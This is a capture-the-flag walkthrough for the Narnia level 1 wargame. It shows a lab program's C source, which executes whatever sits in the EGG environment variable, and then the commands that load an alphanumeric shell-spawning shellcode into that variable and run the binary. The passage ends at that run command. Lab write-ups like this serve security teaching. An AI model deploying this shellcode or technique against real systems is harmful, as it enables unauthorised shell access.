Just like in level 0 we will navigate to the `/narnia` directory, as there were some programs for each level. Let us first take a look at the program `narnia1`:

```bash
narnia1@narnia:/narnia$ ./narnia1
Give me something to execute at the env-variable EGG
```

The source code for the program is (excluding the licensing information):

```c
narnia1@narnia:/narnia$ cat narnia1.c
#include <stdio.h>

int main(){
    int (*ret)();

    if(getenv("EGG")==NULL){
        printf("Give me something to execute at the env-variable EGG\n");
        exit(1);
    }

    printf("Trying to execute EGG!\n");
    ret = getenv("EGG");
    ret();

    return 0;
}
```

The program will try to execute whatever is in the environment variable `EGG`. Currently, that variable is NULL.

```sh
narnia1@narnia:/narnia$ echo $EGG
>>>
```

We need a callable collection of bytes in order to make use of this exploit. This can be achieved using `shellcode`, a piece of code that allows a shell to start upon execution.

Using

```
narnia1@narnia:/narnia$ uname -a
Linux narnia 4.18.12 #1 SMP Tue Oct 16 11:25:23 UTC 2018 x86_64 GNU/Linux
```

we can see that the instruction should be for an `x_86` or `x86_64` OS architecture. There exist loads of different shellcodes for these systems, but we'll take an alphanumeric one.

```bash
narnia1@narnia:/narnia$ export EGG=hzzzzYAAAAAA0HM0hN0HNhu12ZX5ZBZZPhu834X5ZZZZPTYhjaaaX5aaaaP5aaaa5jaaaPPQTUVWaMz
narnia1@narnia:/narnia$ ./narnia1
